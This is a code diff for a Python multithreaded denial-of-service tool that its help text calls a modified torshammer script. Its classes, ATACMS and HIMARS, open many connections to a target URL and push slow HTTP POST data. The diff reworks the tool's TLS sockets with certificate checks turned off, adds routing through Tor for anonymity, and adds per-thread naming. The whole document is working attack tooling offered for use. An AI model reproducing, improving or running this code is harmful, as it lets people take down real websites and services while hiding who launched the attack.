@@ -2,11 +2,13 @@
 # -*- coding: utf-8 -*-
 
 from ast import parse
+from ctypes.wintypes import ULARGE_INTEGER
 from importlib.resources import path
 import sys
 from threading import Thread
 import socks
 import http.client
+import re
 from urllib.parse import urlparse
 import ssl
 import socket
@@ -62,13 +64,12 @@ USER_AGENT_PARTS = {
     }
 }
 
-
 class Connection(object):
-
+    
     def __init__(self, target: string, target_port: int, use_ssl: bool, use_tor: bool, tor_ip: string, tor_port: int, tor_password: string):
         
-        self.target = target
-        self.target_port = target_port
+        self.target = target            # absolute URI (i.e. https://google.com)
+        self.target_port = target_port 
         self.use_ssl = use_ssl
         self.use_tor = use_tor
         self.tor_ip = tor_ip
@@ -76,11 +77,11 @@ class Connection(object):
         self.tor_password = tor_password
 
         parsed_url = urlparse(self.target)
-        self.path = parsed_url.path
+        self.path = parsed_url.path                 # (i.e. "/", or "/something/more/")
         if self.path == '': self.path = '/'
-        self.host = parsed_url.netloc.split(':')[0]
+        self.host = parsed_url.netloc.split(':')[0] # url (i.e. google.com)
 
-        self.target_ip = socket.gethostbyname(target.replace('https://', '').replace('http://', ''))
+        self.target_ip = socket.gethostbyname(self.host)
 
         # DEBUG INFO
         if DEBUG:
@@ -90,15 +91,19 @@ class Connection(object):
 class ATACMS(object):
 
 
-    def __init__(self, c: Connection):
+    def __init__(self, c: Connection, threadName:string = ""):
 
         self.c = c
         self.connected = False
-        self.socket = socks.socksocket()
+        self.socket = None
         self.client = None
         self.ssl_wrap = None
+        self.ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+        self.ctx.check_hostname = False
+        self.ctx.verify_mode = ssl.CERT_NONE
 
-        self.name = 'ATACMS'
+        self.name = f'ATACMS [{threadName}]'
+        self.threadName = threadName
 
 
     def _connect(self, ) -> bool:
@@ -106,11 +111,22 @@ class ATACMS(object):
         if self.connected: self._disconnect()
 
         try:
+            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+
+            # c.target is absolute URI (i.e. https://google.com)
+            # c.host is URL (i.e. google.com)
+
             if self.c.use_ssl:
-                self.client = http.client.HTTPSConnection(
-                    self.c.host,
-                    self.c.target_port
-                )
+
+                self.client = self.ctx.wrap_socket(
+                    self.socket, 
+                    server_hostname=self.c.host
+                    )
+                self.client.connect(
+                    (self.c.host,
+                    self.c.target_port)
+                    )
+
             else:
                 if self.c.use_tor:
                     self.socket.setproxy(socks.PROXY_TYPE_SOCKS5, self.c.tor_ip, self.c.tor_port)
@@ -120,14 +136,14 @@ class ATACMS(object):
 
             # DEBUG INFO
             if DEBUG:
-                Colors.debug(f'{type(self).__name__}._connect', 'Connected')
+                Colors.debug(f'{type(self).__name__}._connect in {self.threadName}', 'Connected')
 
         except Exception as e:
             self.connected = False
 
             # DEBUG INFO
             if DEBUG:
-                Colors.debug(f'{type(self).__name__}._connect', f'{e}')
+                Colors.debug(f'{type(self).__name__}._connect in {self.threadName}', f'{e}')
 
         return self.connected
 
@@ -137,11 +153,13 @@ class ATACMS(object):
         if self.connected:
 
             if self.c.use_ssl:
-                try:
-                    self.client.close()
-                    self.client = None
-                except:
-                        pass # silently ignore
+                if self.client is not None:
+                    try:
+                        self.client.close()
+                        self.client = None
+                        self.socket = None
+                    except:
+                            pass # silently ignore
 
             else:
                 if self.socket is not None:
@@ -155,7 +173,7 @@ class ATACMS(object):
                 
                 # DEBUG INFO
                 if DEBUG:
-                    Colors.debug(f'{type(self).__name__}._disconnect', f'Disconnected')
+                    Colors.debug(f'{type(self).__name__}._disconnect in {self.threadName}', f'Disconnected')
                     
             self.connected = False
 
@@ -186,36 +204,14 @@ class ATACMS(object):
         if self.connected:
             try:
 
-                if self.c.use_ssl:
-                    if headers is not None:
-                        self.client.request(
-                            'post',
-                            self.c.path,
-                            None,
-                            headers
-                        )
-                    else:
-                        # self.client.send(msg.encode('utf-8'))
+                data = self._prepare_http(headers, msg)
 
-                        if self.client.sock is None:
-                            if self.client.auto_open:
-                                self.client.connect()
-                            else:
-                                raise Exception('Not connected.')
-                        self.client.sock.sendall(msg.encode('utf-8'))
-                        sleep(1)
-                        self.client.sock.sendall(msg.encode('utf-8'))
-                        self.client.sock.sendall(msg.encode('utf-8'))
-                        sleep(1)
-                        self.client.sock.sendall(msg.encode('utf-8'))
-                        self.client.sock.sendall(msg.encode('utf-8'))
+                if self.c.use_ssl: self.client.sendall(data.encode('utf-8'))
+                else: self.socket.sendall(data.encode('utf-8'))
 
-                        i = 99
-
-                else:
-                    
-                    msg = self._prepare_http(headers, msg)
-                    self.socket.sendall(msg.encode('utf-8'))
+                # DEBUG INFO
+                if DEBUG:
+                    Colors.debug(f'{type(self).__name__}.__init__', f'Sent: {msg}')
             
             except Exception as e:
                 
@@ -223,8 +219,8 @@ class ATACMS(object):
                 self.connected = False
 
                 # DEBUG INFO
-                if DEBUG:
-                    Colors.debug(f'{type(self).__name__}._send_http', f'{e}')
+                #if DEBUG:
+                #    Colors.debug(f'{type(self).__name__}._send_http in {self.threadName}', f'{e}')
 
                 return False
             return True
@@ -278,7 +274,7 @@ class ATACMS(object):
                 if not self._send_header(content_length) and not stop: 
                     # DEBUG INFO
                     if DEBUG:
-                        Colors.debug(f'{type(self).__name__}.send', f'Not able to send first message')
+                        Colors.debug(f'{type(self).__name__}.send in {self.threadName}', f'Not able to send first message')
                     return False
 
                 for _ in range(content_length):
@@ -289,7 +285,7 @@ class ATACMS(object):
                             
                         # DEBUG INFO
                         if DEBUG:
-                            Colors.debug(f'{type(self).__name__}.send', f'Not able to send message')
+                            Colors.debug(f'{type(self).__name__}.send in {self.threadName}', f'Not able to send message')
 
                         return False
 
@@ -303,7 +299,7 @@ class ATACMS(object):
 
                 # DEBUG INFO
                 if DEBUG:
-                    Colors.debug(f'{type(self).__name__}.send', f'{e}')
+                    Colors.debug(f'{type(self).__name__}.send in {self.threadName}', f'{e}')
 
         return False
 
@@ -473,11 +469,12 @@ class ATACMS(object):
 class HIMARS(Thread):
 
 
-    def __init__(self, c: Connection):
+    def __init__(self, c: Connection, name: string = ''):
 
         super(HIMARS, self).__init__()
         self.c = c
-        self.atacms = ATACMS(self.c)
+        self.name = name
+        self.atacms = ATACMS(self.c, self.name)
 
 
     def run(self,):
@@ -492,7 +489,7 @@ def main(argv):
     global stop
    
     parser = argparse.ArgumentParser(description='This script is a modified torshammer script with few additional functionalities taken from blackhorizon.')
-    parser.add_argument('-t', '--target', help='URL address of the target.', type=ascii, required=True)
+    parser.add_argument('-t', '--target', help='Absolute URI of the target.', type=ascii, required=True)
     parser.add_argument('-p', '--port', help='Target\'s port., default=80', type=int, default=80)
     parser.add_argument('-r', '--threads', help='Number of threads', type=int, required=True)
 
@@ -501,9 +498,25 @@ def main(argv):
     tor_parser.add_argument('-i', '--tor-ip', help='TOR IP address and port, default=127.0.0.1', default='127.0.0.1', type=ascii)
     tor_parser.add_argument('-o', '--tor-port', help='TOR\'s port, default=9050', default=9050, type=int)
     tor_parser.add_argument('-s', '--tor-password', help='TOR service pasword', type=ascii)
-    
+
     args = parser.parse_args(argv)
+
+    # check url
     args.target = args.target.replace('\'','')
+
+    urlRegex = re.compile(
+        r'^(?:http|ftp)s?://' # http:// or https://
+        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
+        r'localhost|' #localhost...
+        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
+        r'(?::\d+)?' # optional port
+        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
+
+    if not re.match(urlRegex, args.target):
+        Colors.error('Invalid target url. Please use absolute URI (i.e. https://google.com).')
+        sys.exit()
+    
+    # check other arguments
     args.ssl = args.target.startswith('https') == True
 
     if args.ssl and args.port != 443:
@@ -517,7 +530,7 @@ def main(argv):
     args.tor_port = 0
     args.tor_password = ''
 
-    if hasattr(args, 'tor_ip'): 
+    if hasattr(args, 'tor_password') and len(args.tor_password) > 0: 
         if not args.ssl:
             args.use_tor = True
             args.tor_ip  = args.tor_ip.replace('\'','')
@@ -531,13 +544,14 @@ def main(argv):
 
     nthreads = args.threads
 
+    # save arguments
     c = Connection(
-        args.target,
-        args.port,
-        args.ssl,
-        args.use_tor,
-        args.tor_ip,
-        args.tor_port,
+        args.target,    # absolute URI
+        args.port,      # target port
+        args.ssl,       # True or False
+        args.use_tor,   # True or False
+        args.tor_ip,    # TOR IP
+        args.tor_port,  # TOR port
         args.tor_password
     )
 
@@ -549,7 +563,7 @@ def main(argv):
 
     threads = []
     for i in range(nthreads): 
-        t = HIMARS(c)
+        t = HIMARS(c, f'Thread-{i+1}')
         threads.append(t)
         t.start()
 
